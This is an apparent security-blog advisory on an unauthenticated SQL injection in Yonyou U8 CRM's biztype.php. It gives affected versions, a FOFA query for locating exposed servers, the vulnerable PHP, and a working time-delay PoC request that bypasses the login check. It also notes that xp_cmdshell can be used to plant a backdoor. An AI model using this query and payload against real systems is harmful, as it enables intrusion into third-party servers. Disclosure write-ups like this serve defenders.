---
title: "用友U8 CRM biztype.php SQL注入漏洞"
source: https://mrxn.net/jswz/yonyon-u8crm-activity-biztype-actvtID-sqli.html
asset_dir: assets/用友u8-crm-biztype.php-sql注入漏洞
---

# 用友U8 CRM biztype.php SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/5/24 08:27
- 912浏览
- [0评论](#comment)
- 21分钟阅读

深入探索

服务器

CRM

SQL

---

# 漏洞简介

[用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B)U8 CRM[客户关系管理](#)系统是一款专业的企业级CRM[软件](#)，旨在帮助企业高效管理[客户关系](#)、提升销售业绩和提供优质的客户服务。用友 U8 CRM客户关系管理系统 `biztype.php` 文件存在[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞，未经身份验证的攻击者通过漏洞执行任意SQL语句，调用xp\_cmdshell写入后门文件，执行任意代码，从而获取到服务器权限。

客户关系管理

# 影响版本

V18, V16.5, V16.1, V16.0, V15.1, V13

# fofa语法

> `title="用友U8CRM"`

# 漏洞分析

那直接看 `U8SOFT/turbocrm70/code/www/servicequotation/activity/biztype.php` 业务逻辑实现关键部分

```
<?
        include_once("tglobal.lib");        
        $actvtID = $_POST['actvtID'];
        $bizTypeArrs = array();//业务类型
        $sql = "select COUNT( distinct cost_class_id) num from tc_activity_cost_d where actvt_id='$actvtID'";
        $rs = $gblDB->Query($sql);
        if ($rs)
        {
                if ($rs->fetchRecord())
                        $num = $rs->getFieldValueByName("num");                                
                $rs->close();
        }

        $typeSql=getUFSqlScope("operation_type","",UFVIEW,false);//取当前操作员业务类型权限
        $sql="select count(a.OperationTypeCode) num,a.OperationTypeCode,b.Name from NE_OperationType_ExpenseItem a left outer join NE_OperationType b ";
        $sql.="on a.OperationTypeCode=b.Code where b.TypeID=2 and b.isPublished=1 and ExpenseItemCode in (select cost_class_id from tc_activity_cost_d where actvt_id='$actvtID')";
        //加上数据权限控制
         if(!isEmptyString($typeSql))
                $sql.="and a.OperationTypeCode in($typeSql)";
        $sql.="group by a.OperationTypeCode,b.Name";
        $rs = $gblDB->Query($sql);
        if ($rs)
        {
                while ($rs->fetchRecord()){
                        if($rs->getFieldValueByName("num")==$num)
                                $bizTypeArrs[$rs->getFieldValueByName("OperationTypeCode")]=$rs->getFieldValueByName("Name");
                }                                                        
                        $rs->close();
        }
        echo json_encode($bizTypeArrs);
```

POST 请求的 `actvtID` 字符串中无任何过滤，无任何过滤和校验，造成[sql注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)。

# 漏洞复现

```
POST /activity/biztype.php HTTP/1.1
Host: u8crm.mrxn.net
Cookie: PHPSESSID=bgsesstimeout-;
Content-Type: application/x-www-form-urlencoded

DontCheckLogin=1&actvtID=1%27;WAITFOR%20DELAY%20'0:0:2'--
```

[![用友U8 CRM biztype.php SQL注入漏洞](images/img-001-ea3a381e8cbd.webp)](https://image.mrxn.net/1a6a5dde6c8c4984a5009da4ffaf9465.webp)

成功延时 2 秒

SQL注入防护

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
